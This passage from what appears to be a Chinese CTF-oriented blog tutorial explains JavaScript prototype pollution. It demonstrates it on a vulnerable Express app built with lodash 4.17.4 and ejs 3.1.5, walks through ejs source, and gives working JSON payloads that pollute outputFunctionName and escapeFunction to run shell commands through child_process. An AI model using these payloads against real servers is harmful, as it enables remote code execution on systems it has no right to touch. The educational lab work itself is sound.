+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target , source</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source)&#123;</span><br><span class="line">        <span class="keyword">if</span>(key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target)&#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key],source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的话会遍历source中所有的属性，如果source和target中都有该属性，则执行合并操作，没有的话则直接赋值</p>
+<p>该说不说，不如拿个实例调试一下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> target = &#123;a : &#123;b : <span class="number">1</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">const</span> source = &#123;a : &#123;c : <span class="number">2</span>&#125;&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们调试一下</p>
+<p><img src="/../image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250529154429254.png" alt="image-20250529154429254"></p>
+<p>先是提取了source的key，这里的key为<code>a</code></p>
+<p><img src="/../image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250529154534250.png" alt="image-20250529154534250"></p>
+<p>因为这里两个key一样，所以进入递归</p>
+<p><img src="/../image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250529154627591.png" alt="image-20250529154627591"></p>
+<p>再次提取key为c，但是target的key为b，此时进入不了if语句，进入else语句，那么此时就会生成一个键值对<code>c : 2</code>，所以最后的target就是</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">a</span>: &#123; <span class="attr">b</span>: <span class="number">1</span>, <span class="attr">c</span>: <span class="number">2</span> &#125; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为这里存在赋值的操作，那么如果key是<code>__proto__</code>呢，我们是否就可以实现原型链污染呢</p>
+<p>测试一下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> target = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> source = &#123;<span class="attr">a</span>: <span class="number">1</span>,<span class="string">&quot;__proto__&quot;</span> :&#123;b : <span class="number">2</span>&#125;&#125;</span><br><span class="line"><span class="title function_">merge</span>(target,source)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(target)</span><br><span class="line"><span class="keyword">let</span> a = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">b</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250529155830383.png" alt="image-20250529155830383"></p>
+<p>合并执行了但是并没有污染，这是为什么呢？</p>
+<p>其实是因为，在source创建对象的过程中，其里面的<code>__proto__</code>已经是表示的是source的原型了，例如我们打印一下source的原型</p>
+<p><img src="/../image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250529160018922.png" alt="image-20250529160018922"></p>
+<p>那么此时遍历source的所有键名，我们拿到的只能是a和b而没有<code>__proto__</code>，自然也就不会污染对象原型的值</p>
+<p>所以我们需要解决一个问题，那就是如何让<code>__proto__</code>被认为是一个Key？很简单，就是关于json的解析问题，如果我们将代码改一下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> target = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> source = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(target,source)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(target)</span><br><span class="line"><span class="keyword">let</span> a = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">b</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里利用JSON.parse函数将json格式的数据转化成对象，那么此时对象就是键值对的形式，<code>__proto__</code>就会被认为是一个key而非其原型</p>
+<h3 id="不同对象的原型链"><a href="#不同对象的原型链" class="headerlink" title="不同对象的原型链"></a>不同对象的原型链</h3><p>我们看看不同类型对象的原型链是什么样的</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="comment">// o对象直接继承了Object.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// o ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="string">&quot;yo&quot;</span>, <span class="string">&quot;whadup&quot;</span>, <span class="string">&quot;?&quot;</span>];</span><br><span class="line"><span class="comment">// 数组都继承于 Array.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 函数对象都继承于 Function.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</span></span><br></pre></td></tr></table></figure>
+
+<p>在了解了不同对象的原型链后，我们就能理解为什么同类型的不同对象访问同一个属性的时候为什么值是一样的了</p>
+<h2 id="ejs模板引擎原型链污染导致RCE"><a href="#ejs模板引擎原型链污染导致RCE" class="headerlink" title="ejs模板引擎原型链污染导致RCE"></a>ejs模板引擎原型链污染导致RCE</h2><p>在js中常规来说RCE的前提都是需要有原型链污染的，那我们看看ejs模板引擎里怎么实现RCE的呢？</p>
+<p>本地搭建一下环境</p>
+<p>创建一个index.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> _= <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="comment">//设置模板的位置</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, __dirname);</span><br><span class="line"><span class="comment">//进行渲染</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> malicious_payload = req.<span class="property">query</span>.<span class="property">malicious_payload</span>;</span><br><span class="line">    _.<span class="title function_">merge</span>(&#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(malicious_payload));</span><br><span class="line">    res.<span class="property">render</span> (<span class="string">&quot;./test.ejs&quot;</span>,&#123;</span><br><span class="line">        <span class="attr">message</span>: <span class="string">&#x27;lufei test &#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置http</span></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">8888</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> port = server.<span class="title function_">address</span>().<span class="property">port</span></span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;测试环境，访问地址为 http://127.0.0.1:%s&quot;</span>, port)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>然后写个模板引擎文件test.ejs</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;&lt;%= message%&gt;&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这两个文件需要在同一目录下并且版本要对</p>
+<p>安装一下依赖</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm init -y</span><br><span class="line">npm install ejs@3.1.5 lodash@4.17.4 express</span><br></pre></td></tr></table></figure>
+
+<p>第一个是node.js项目初始化的一个命令，第二个就是安装一些依赖和第三方库</p>
+<p><img src="/../image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250601134859020.png" alt="image-20250601134859020"></p>
+<p>传入payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8888/?malicious_payload=&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);var __tmp2&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250601135027831.png" alt="image-20250601135027831"></p>
+<p>分析一下</p>
+<h3 id="源码分析-接近真相"><a href="#源码分析-接近真相" class="headerlink" title="源码分析&amp;接近真相"></a>源码分析&amp;接近真相</h3><p>其实这里本来没有替换函数，但是在loadsh中有原生的替换函数，参考官方文档<a target="_blank" rel="noopener" href="https://www.lodashjs.com/docs/lodash.merge">lodash.merge</a></p>
+<p>我们跟进这个函数看一下</p>
+<p><img src="/../image/achieve/202411/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250601135718672.png" alt="image-20250601135718672"></p>
+<p>跟进后发现</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//assignMergeValue</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">assignMergeValue</span>(<span class="params">object, key, value</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((value !== <span class="literal">undefined</span> &amp;&amp; !<span class="title function_">eq</span>(object[key], value)) ||</span><br><span class="line">          (value === <span class="literal">undefined</span> &amp;&amp; !(key <span class="keyword">in</span> object))) &#123;</span><br><span class="line">        <span class="title function_">baseAssignValue</span>(object, key, value);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现和正常的merge替换函数没什么区别</p>
+<p>然后我们看看ejs引擎的renderFile函数</p>
+<p>在 EJS（Embedded JavaScript）模板引擎中，renderFile() 是一个用于加载和渲染模板文件的方法。它通常与 Express 框架一起使用。</p>
+<p>renderFile() 方法的作用是读取指定的 EJS 模板文件，并将数据填充到模板中生成最终的 HTML 内容。这个方法多用于将动态数据注入到模板中，以生成动态的网页内容</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">renderFile</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> args = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>.<span class="title function_">call</span>(<span class="variable language_">arguments</span>);<span class="comment">//将arguments转为数组</span></span><br><span class="line">  <span class="keyword">var</span> filename = args.<span class="title function_">shift</span>();</span><br><span class="line">  <span class="keyword">var</span> cb;</span><br><span class="line">  <span class="keyword">var</span> opts = &#123;<span class="attr">filename</span>: filename&#125;;</span><br><span class="line">  <span class="keyword">var</span> data;</span><br><span class="line">  <span class="keyword">var</span> viewOpts;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Do we have a callback?</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="variable language_">arguments</span>[<span class="variable language_">arguments</span>.<span class="property">length</span> - <span class="number">1</span>] == <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">    cb = args.<span class="title function_">pop</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Do we have data/opts?</span></span><br><span class="line">  <span class="keyword">if</span> (args.<span class="property">length</span>) &#123;</span><br><span class="line">    <span class="comment">// Should always have data obj</span></span><br><span class="line">    data = args.<span class="title function_">shift</span>();</span><br><span class="line">    <span class="comment">// Normal passed opts (data obj + opts obj)</span></span><br><span class="line">    <span class="keyword">if</span> (args.<span class="property">length</span>) &#123;</span><br><span class="line">      <span class="comment">// Use shallowCopy so we don&#x27;t pollute passed in opts obj with new vals</span></span><br><span class="line">      utils.<span class="title function_">shallowCopy</span>(opts, args.<span class="title function_">pop</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Special casing for Express (settings + opts-in-data)</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// Express 3 and 4</span></span><br><span class="line">      <span class="keyword">if</span> (data.<span class="property">settings</span>) &#123;</span><br><span class="line">        <span class="comment">// Pull a few things from known locations</span></span><br><span class="line">        <span class="keyword">if</span> (data.<span class="property">settings</span>.<span class="property">views</span>) &#123;</span><br><span class="line">          opts.<span class="property">views</span> = data.<span class="property">settings</span>.<span class="property">views</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (data.<span class="property">settings</span>[<span class="string">&#x27;view cache&#x27;</span>]) &#123;</span><br><span class="line">          opts.<span class="property">cache</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Undocumented after Express 2, but still usable, esp. for</span></span><br><span class="line">        <span class="comment">// items that are unsafe to be passed along with data, like `root`</span></span><br><span class="line">        viewOpts = data.<span class="property">settings</span>[<span class="string">&#x27;view options&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (viewOpts) &#123;</span><br><span class="line">          utils.<span class="title function_">shallowCopy</span>(opts, viewOpts);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Express 2 and lower, values set in app.locals, or people who just</span></span><br><span class="line">      <span class="comment">// want to pass options in their data. <span class="doctag">NOTE:</span> These values will override</span></span><br><span class="line">      <span class="comment">// anything previously set in settings  or settings[&#x27;view options&#x27;]</span></span><br><span class="line">      utils.<span class="title function_">shallowCopyFromList</span>(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);</span><br><span class="line">    &#125;</span><br><span class="line">    opts.<span class="property">filename</span> = filename;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    data = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">tryHandleCache</span>(opts, data, cb);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>最后会返回tryHandleCache函数的值，从代码中可以看到，如果我们能控制返回的结果，是不是就可以进行攻击注入呢？，我们跟进这个函数看下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">tryHandleCache</span>(<span class="params">options, data, cb</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> result;</span><br><span class="line">  <span class="keyword">if</span> (!cb) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">exports</span>.<span class="property">promiseImpl</span> == <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">exports</span>.<span class="title function_">promiseImpl</span>(<span class="keyword">function</span> (<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          result = <span class="title function_">handleCache</span>(options)(data);</span><br><span class="line">          <span class="title function_">resolve</span>(result);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">          <span class="title function_">reject</span>(err);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Please provide a callback function&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      result = <span class="title function_">handleCache</span>(options)(data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">cb</span>(err);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, result);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里无论如何都会利用handleCache渲染模板，我们跟进handleCache函数看看</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">handleCache</span>(<span class="params">options, template</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> func;</span><br><span class="line">  <span class="keyword">var</span> filename = options.<span class="property">filename</span>;</span><br><span class="line">  <span class="keyword">var</span> hasTemplate = <span class="variable language_">arguments</span>.<span class="property">length</span> &gt; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (options.<span class="property">cache</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!filename) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;cache option requires a filename&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    func = <span class="built_in">exports</span>.<span class="property">cache</span>.<span class="title function_">get</span>(filename);</span><br><span class="line">    <span class="keyword">if</span> (func) &#123;</span><br><span class="line">      <span class="keyword">return</span> func;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!hasTemplate) &#123;</span><br><span class="line">      template = <span class="title function_">fileLoader</span>(filename).<span class="title function_">toString</span>().<span class="title function_">replace</span>(_BOM, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!hasTemplate) &#123;</span><br><span class="line">    <span class="comment">// istanbul ignore if: should not happen at all</span></span><br><span class="line">    <span class="keyword">if</span> (!filename) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Internal EJS error: no file name or template &#x27;</span></span><br><span class="line">                    + <span class="string">&#x27;provided&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    template = <span class="title function_">fileLoader</span>(filename).<span class="title function_">toString</span>().<span class="title function_">replace</span>(_BOM, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  func = <span class="built_in">exports</span>.<span class="title function_">compile</span>(template, options);</span><br><span class="line">  <span class="keyword">if</span> (options.<span class="property">cache</span>) &#123;</span><br><span class="line">    <span class="built_in">exports</span>.<span class="property">cache</span>.<span class="title function_">set</span>(filename, func);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> func;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数的返回值是<code>func</code>，而<code>func</code>是<code> exports.compile(template, options)</code>的返回值,我们跟进complie函数</p>
+<p><img src="/../image/achieve/202411/nodejs--ctfshow/image-20250601123040513.png" alt="image-20250601123040513"></p>
+<p>如果能够覆盖 <code>opts.outputFunctionName</code> , 这样我们构造的payload就会被拼接进js语句中，并在 ejs 渲染时进行 RCE</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prepended += <span class="string">&#x27;  var &#x27;</span> + opts.<span class="property">outputFunctionName</span> + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>例如我们拼接命令语句</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prepended += <span class="string">&#x27;  var &#x27;</span> + outputFunctionName<span class="string">&quot;:&quot;</span>__tmp1;<span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(\<span class="string">&#x27;chile_process\&#x27;).execSync(\&#x27;ls\&#x27;);var __tmp2 + &#x27;</span> = __append;<span class="string">&#x27; + &#x27;</span>\n<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<p>前后分别给出一个变量，中间插入我们的命令执行语句，当然后面的也可以直接注释掉</p>
+<p>所以我们可以传入opts.outputFunctionName的值为</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outputFunctionName<span class="string">&quot;:&quot;</span>__tmp1;<span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(\<span class="string">&#x27;chile_process\&#x27;).execSync(\&#x27;ls\&#x27;);var __tmp2</span></span><br></pre></td></tr></table></figure>
+
+<p>这时候就需要用原型链污染了，将outputFunctionName的值污染一下就可以实现RCE了</p>
+<p>参考题目：ctfshowweb入门341</p>
+<p>ejs模板引擎RCE不止存在一个，还有另一处能RCE</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> escapeFn = opts.<span class="property">escapeFunction</span>;</span><br><span class="line"><span class="keyword">if</span> (opts.<span class="property">client</span>) &#123;</span><br><span class="line">  src = <span class="string">&#x27;escapeFn = escapeFn || &#x27;</span> + escapeFn.<span class="title function_">toString</span>() + <span class="string">&#x27;;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span> + src;</span><br><span class="line">  <span class="keyword">if</span> (opts.<span class="property">compileDebug</span>) &#123;</span><br><span class="line">    src = <span class="string">&#x27;rethrow = rethrow || &#x27;</span> + rethrow.<span class="title function_">toString</span>() + <span class="string">&#x27;;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span> + src;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里也同样会拼接，污染 <code>opts.escapeFunction</code> 也可以进行 RCE</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);&quot;,&quot;compileDebug&quot;:true&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);&quot;,&quot;compileDebug&quot;:true,&quot;debug&quot;:true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="jade模板原型链污染导致RCE"><a href="#jade模板原型链污染导致RCE" class="headerlink" title="jade模板原型链污染导致RCE"></a>jade模板原型链污染导致RCE</h2><p>懒得搭环境了，直接拿web342的附件来分析了</p>
+<p>先在app.js中加上一个调试的端口地址</p>
